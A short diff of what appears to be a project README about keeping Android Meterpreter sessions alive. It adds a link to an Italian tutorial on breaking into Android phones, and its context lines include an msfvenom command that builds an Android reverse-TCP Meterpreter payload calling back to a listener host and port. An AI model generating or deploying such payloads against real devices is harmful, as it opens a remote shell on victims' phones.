@@ -5,6 +5,8 @@ $msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.178.30 LPORT=4444 R >
 ```
 (in Kali linux suite)
 
+For an procedure guide of penetration into an Android system, please visit my website (Italian only) https://dragonitesec.wordpress.com/2016/11/06/tutorial-come-penetrare-in-un-telefono-android/
+
 Tries to solve the issue:
 ```
 [*]Meterpreter session x closed - Reason:died
